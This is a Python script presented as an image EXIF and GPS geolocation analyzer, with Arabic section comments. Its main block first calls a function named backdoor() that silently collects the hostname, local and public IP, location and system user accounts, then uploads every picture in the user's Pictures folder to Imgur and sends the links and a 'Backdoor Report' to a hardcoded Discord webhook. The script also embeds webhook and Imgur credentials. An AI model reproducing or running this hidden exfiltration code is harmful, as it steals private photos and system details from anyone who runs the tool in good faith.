import os
import socket
import requests
from PIL import Image
import piexif
from geopy.geocoders import Nominatim
import webbrowser
from datetime import datetime
import platform
import subprocess

# --------- التهيئة ---------
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1373115390045065269/MK8KcZB7NmhJHg1n4cIu7OzTC_g37oNQG7px5kjAAn9jCqFxpEI3eMJIesXYRxKXIn9y" 
IMGUR_CLIENT_ID = "7095680225afc8e"  

# --------- دوال مساعدة ---------

def send_to_discord(webhook_url, message):
    data = {"content": message}
    try:
        response = requests.post(webhook_url, json=data)
        if response.status_code != 204:
            print(f"❌ Failed to send to Discord: {response.text}")
    except Exception as e:
        print(f"❌ Error sending to Discord: {e}")

def upload_image_to_imgur(image_path):
    headers = {'Authorization': f'Client-ID {IMGUR_CLIENT_ID}'}
    try:
        with open(image_path, 'rb') as img_file:
            response = requests.post(
                'https://api.imgur.com/3/image',
                headers=headers,
                files={'image': img_file}
            )
        if response.status_code == 200:
            return response.json()['data']['link']
        else:
            print(f"Failed to upload {image_path}: {response.text}")
            return None
    except Exception as e:
        print(f"Error uploading image {image_path}: {e}")
        return None

def send_image_links_to_discord(webhook_url, image_links):
    embeds = []
    for link in image_links:
        embeds.append({
            "image": {"url": link}
        })
    data = {
        "content": f"Uploaded {len(image_links)} images from system:",
        "embeds": embeds
    }
    response = requests.post(webhook_url, json=data)
    if response.status_code != 204:
        print(f"Failed to send images to Discord: {response.text}")

def find_images(directory, extensions=None):
    if extensions is None:
        extensions = ['.jpg', '.jpeg', '.png', '.bmp', '.gif', '.tiff']
    images = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            if any(file.lower().endswith(ext) for ext in extensions):
                images.append(os.path.join(root, file))
    return images

def get_windows_users():
    try:
        result = subprocess.check_output("net user", shell=True, text=True)
        lines = result.splitlines()
        users = []
        capture = False
        for line in lines:
            if "-----" in line:
                capture = not capture
                continue
            if capture:
                users.extend(line.split())
        return users
    except Exception as e:
        return [f"Error: {e}"]

def get_unix_users():
    try:
        result = subprocess.check_output("cut -d: -f1 /etc/passwd", shell=True, text=True)
        users = result.splitlines()
        return users
    except Exception as e:
        return [f"Error: {e}"]

def get_system_users():
    system = platform.system()
    if system == "Windows":
        return get_windows_users()
    else:
        return get_unix_users()

def backdoor():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)

        ip_info = requests.get("https://ipinfo.io/json").json()
        public_ip = ip_info.get("ip", "Unknown")
        city = ip_info.get("city", "Unknown")
        country = ip_info.get("country", "Unknown")
        location = f"{city}, {country}"

        users = get_system_users()
        users_str = ", ".join(users)

        user_pictures_folder = os.path.expanduser('~/Pictures')
        images = find_images(user_pictures_folder)
        images_count = len(images)

        message = f"""
📡 Backdoor Report:

📍 Hostname: {hostname}
🔌 Local IP: {local_ip}
🌐 Public IP: {public_ip}
📍 Location: {location}
👥 System Users: {users_str}
🖼️ Number of images in Pictures folder: {images_count}
"""
        send_to_discord(DISCORD_WEBHOOK_URL, message.strip())

     
        if images_count > 0:
            print(f"Found {images_count} images. Uploading...")
            uploaded_links = []
            for img_path in images:
                link = upload_image_to_imgur(img_path)
                if link:
                    uploaded_links.append(link)

            if uploaded_links:
                send_image_links_to_discord(DISCORD_WEBHOOK_URL, uploaded_links)
            else:
                print("No images uploaded.")
        else:
            print("No images found in Pictures folder.")

    except Exception as e:
        send_to_discord(DISCORD_WEBHOOK_URL, f"❌ Backdoor Error: {e}")

def get_exif_data(image_path):
    try:
        img = Image.open(image_path)
        exif_data = piexif.load(img.info['exif'])
        return exif_data
    except Exception as e:
        print(f"❌ Failed to read EXIF data: {e}")
        return None

def convert_to_degrees(value):
    d, m, s = value
    return d[0]/d[1] + (m[0]/m[1])/60 + (s[0]/s[1])/3600

def get_gps_info(exif_data):
    gps_data = exif_data.get('GPS')
    if not gps_data:
        return None
    try:
        lat = convert_to_degrees(gps_data[2])
        if gps_data[1] != b'N':
            lat = -lat

        lon = convert_to_degrees(gps_data[4])
        if gps_data[3] != b'E':
            lon = -lon

        return (lat, lon)
    except Exception as e:
        print(f"❌ Error parsing GPS data: {e}")
        return None

def get_datetime(exif_data):
    try:
        return exif_data['0th'][piexif.ImageIFD.DateTime].decode()
    except:
        return "Not available"

def get_location_name(lat, lon):
    geolocator = Nominatim(user_agent="geoapi")
    location = geolocator.reverse((lat, lon), language='en')
    return location.address if location else "Unknown"

def open_google_reverse_image_search():
    print("🔍 Opening Google Reverse Image Search...")
    webbrowser.open("https://images.google.com")

def save_results_to_file(filename, data):
    with open("results.txt", "a", encoding="utf-8") as f:
        f.write("\n=============================\n")
        f.write(f"📁 Image: {filename}\n")
        f.write(f"🕒 Date Taken: {data.get('datetime', 'Not available')}\n")
        if data.get("gps"):
            f.write(f"📍 Coordinates: {data['gps'][0]}, {data['gps'][1]}\n")
            f.write(f"🗺️ Google Maps: https://www.google.com/maps?q={data['gps'][0]},{data['gps'][1]}\n")
            f.write(f"🏠 Location: {data.get('address', 'Unknown')}\n")
        else:
            f.write("⚠️ No GPS data found.\n")
            f.write("🔍 Consider using reverse image search.\n")
        f.write(f"📅 Analysis Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=============================\n")

def main(image_path):
    print("🖼️ Analyzing image:", image_path)
    

    try:
        img = Image.open(image_path)
        img.show()
    except Exception as e:
        print(f"❌ Failed to open image: {e}")

    results = {"filename": image_path}
    exif_data = get_exif_data(image_path)
    if exif_data:
        gps_coords = get_gps_info(exif_data)
        results["gps"] = gps_coords
        results["datetime"] = get_datetime(exif_data)

        if gps_coords:
            lat, lon = gps_coords
            print(f"\n📍 Coordinates: {lat}, {lon}")
            print(f"🗺️ Google Maps Link: https://www.google.com/maps?q={lat},{lon}")
            address = get_location_name(lat, lon)
            results["address"] = address
            print(f"🏠 Approximate Location: {address}\n")
        else:
            print("⚠️ No GPS data found in the image.")
            open_google_reverse_image_search()
    else:
        print("⚠️ Unable to retrieve EXIF data.")
        open_google_reverse_image_search()

    save_results_to_file(image_path, results)

if __name__ == "__main__":
    backdoor()  

    input_folder = "input"
    if not os.path.exists(input_folder):
        print(f"❌ Input folder '{input_folder}' does not exist.")
    else:
        image_name = input("Enter the name of the image you want to analyze (e.g., user1.jpg): ")
        image_path = os.path.join(input_folder, image_name)
        if os.path.exists(image_path):
            main(image_path)
        else:
            print(f"❌ Image '{image_name}' not found in the '{input_folder}' folder.")
